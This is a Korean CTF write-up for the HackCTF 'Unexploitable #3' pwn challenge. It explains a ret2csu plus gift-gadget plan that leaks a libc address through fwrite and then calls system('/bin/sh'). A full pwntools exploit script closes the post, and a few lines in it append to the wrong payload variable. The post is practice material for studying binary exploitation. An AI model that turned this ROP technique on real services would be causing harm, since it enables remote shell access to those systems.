---
layout: post
title:  "HacCTF Unexploitable #3 write-up"
date:   2020-03-21 19:45:55
image:  hackctf_unex3.PNG
tags:   [HackCTF]
categories: [Write-up]
---


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%203/Untitled.png)

NX비트말곤 딱히 걸려있는게 없다.

<br>
**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%203/Untitled%201.png)

Unexploitable 의 3번째 문제로서 동일한게 한번 입력을 받고 종료된다.

<br>
**3) 코드흐름 파악**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%203/Untitled%202.png)

메인을 보면, fwrite와 fgets 가 끝이다. fwrite를 이용하여 libc leak을 하면 될 것이다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%203/Untitled%203.png)

또한 gift 라는 함수가 있는데 fwrite함수가 있다. 어셈블리로보면

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%203/Untitled%204.png)

요렇게 되어있다. 어떻게 사용하면 될지 일단 차차 생각해보자.

<br><br>

### 2. 접근방법

---

fgets로 충분히 리턴주소를 덮을수 있다. 그렇다면 fwrite를 이용해 leak을 일으킬라면 4개의 인자를 처리할 수 있는 가젯이 필요하다. 하지만 역시 그런 이쁜 가젯은 현재 존재하지 않는다.

현재 csu_ini 함수가 존재하는데, 이를 이용한다고 쳐도 3개의 인자만 처리가능 할 뿐, 나머지 하나인 rdx 관련 인자를 처리불가능하다. 그럼 혹시 아까 gift 함수를 괜히 준게 아닐꺼 같다는 생각이든다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%203/Untitled%204.png)

0x400658 주소를 보면 mov rcx, [rdi] 가 있다. 이부분을 이용하여 rcx를 이용하면 될 것이다.

현재 가젯에 pop rdi; ret; 는 존재하기 때문에 먼저 rdi에 원하는 값을 넣고, gitf 함수의 가젯을 이용하면 rcx에 아까 넣어둔 rdi 값이 들어갈 것이다.

<br>

- **첫번째 시나리오**
    1. pop rbp; ret; 를 이용해서 .bss 영역에 /bin/sh 저장하기
    2. libc 주소 leak을 해야함 => fwrite() 함수이용할것임
    2.1 RTC 를 이용해서 rdi, rsi, rdx 레지스터에 3개 인자를 넣고
    2.2 마지막 RTC의 ret를 pop rdi;ret로 다시 가게함 => 여기서 rdi에 rcx에 넣을 값 다시 저장
    2.3 gift함수의 mov rcx, [rdi];ret; 를 이용해서 rcx(stdout) 저장
    2.4 이를 이용하여 fgets 주소 leak하기
    3. leak된 주소를 이용하여 libc_base 주소를 구하고 ROP 진행

기존에 Unexploitable 2 에서 진행했던 방법대로 처음에 진행을 했었다. 하지만 어떤 이유인지 자꾸 에러가 발생하여서 디버깅을 통해 확인을 해보았다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%203/Untitled%205.png)

pop rbp; ret; 를 이용하여 bss 영역에 "/bin/sh" 문자열을 잘 저장하였고 gift함수의 가젯을 이용하여 rcx에 stdout_got 주소를 잘 저장하였다. 따라서 총 4개의 인자를 처리할 수 있는 세팅이 완료됬고, csu의 " call [r12 + rbx*8] "이 진행되어 원래대로라면 fwrite함수가 호출되어 fgets의 주소가 leak되야 한다.

하지만 현재 rcx에 stdout_got가 들어가 있긴 하지만, "pop rbp;ret;" 가 진행되고 setvbuf, fwrite, 함수를 건너뛰고 바로 main+98로 다시 갔기 때문에 stdout이 한번도 사용되지 않아 got에 실 주소가 들어가있지 않고 위 사진처럼 0x400743주소가 들어가 있다.

<br>

따라서 " call [r12 + rbx*8] " 이 실행됬을 때 에러가 나는 것이다. 결국 다른 시나리오를 이용해야한다.

<br>

- **두번째 시나리오**
    1. 바로 libc 주소 leak하기
        - 첫번째 ROP를 진행할때는 이미 위에 setvbuf와 fwrite가 실행된 상태이므로 stdout_got에 실제 주소가 들어가 있음. 따라서 csu가젯과 gift 가젯을 이용하여 rcx에 stdout_got주소를 첫번째 시나리오와 동일하게 삽입하면 됨
        - 그런뒤 다시 main으로 ret하게 만듬
    2. fgets를 이용하여 bss영역에 /bin/sh 삽입
    3. pop rdi;ret 가젯을 이용하여 /bin/sh 문자열이 존재하는 bss 영역을 rdi에 저장하고 system함수 호출

두번째 시나리오대로 코드를 짜면 정상적으로 쉘이 떨어진다.

<br><br><br>

### 3. 풀이

---

최종익스코드는 다음과 같다
```python
from pwn import *
context.log_level="DEBUG"
p=remote("ctf.j0n9hyun.xyz",3034)
#p=process("./Unexploitable_3")
e=ELF("./Unexploitable_3")
#gdb.attach(p)

bss=0x601038

gadget_1=0x40073A # pop rbx,rbp,r12,r13,r14,r15,ret;
gadget_2=0x400720 # mov rdx,r13; mov rsi,r14; mov esi,r15d; call [r12+rbx*8]; add rbx,1; cmp rbx,rbp 
gadget_3=0x400658 # mov rcx,[rdi]; ret;
gadget_4=0x400743 # pop rdi; ret;

p.recvuntil("you!\n")

payload2 = "A"*0x18
payload2 += p64(gadget_4)
payload2 += p64(0x601050) # for rcx
payload2 += p64(gadget_3)
payload2 += p64(gadget_1)
payload2 += p64(0) # rbx
payload2 += p64(1) # rbp
payload2 += p64(e.got['fwrite']) # r12
payload2 += p64(6) # r13
payload2 += p64(1) # r14
payload2 += p64(e.got['fwrite']) # r15
payload2 += p64(gadget_2)
payload2 += p64(0)
payload2 += p64(0) #rbx
payload2 += p64(1) #rbp
payload2 += p64(0) #r12
payload2 += p64(0) #r13
payload2 += p64(0)  #r14
payload2 += p64(0) #r15
payload2 += p64(0x40065f)
pause()
p.sendline(payload2)

fwrite_addr=u64(p.recv(6)+"\x00\x00")
log.info(hex(fwrite_addr))
libc_base=fwrite_addr-0x06e6e0

payload3 = "A"*0x18
payload2 += p64(gadget_4)
payload2 += p64(0x601060) # for rcx
payload2 += p64(gadget_3)
payload3 += p64(gadget_1)
payload3 += p64(0) # rbx
payload3 += p64(1) # rbp
payload3 += p64(e.got['fgets']) # r12
payload3 += p64(libc_base+0x3c48e0) # r13
payload3 += p64(8) # r14
payload3 += p64(bss) # r15
payload3 += p64(gadget_2)
payload3 += p64(0)
payload3 += p64(0) #rbx
payload3 += p64(1) #rbp
payload3 += p64(0) #r12
payload3 += p64(0) #r13
payload3 += p64(0) #r14
payload3 += p64(0) #r15
payload3 += p64(gadget_4)
payload3 += p64(bss)
payload3 += p64(libc_base+0x045390)

p.recvuntil("you!\n")
p.sendline(payload3)
p.send("/bin/sh\x00")
p.interactive()
```
<br><br>

### 4. 몰랐던 개념

---

방법은 알았지만, stdout_got 때문에 삽질을 꽤 오래했다. stdout, stdin도 libc에 wrapping되어있는 함수인것을 이제 알았다. 따라서 해당 함수들도 plt와 got가 존재한다.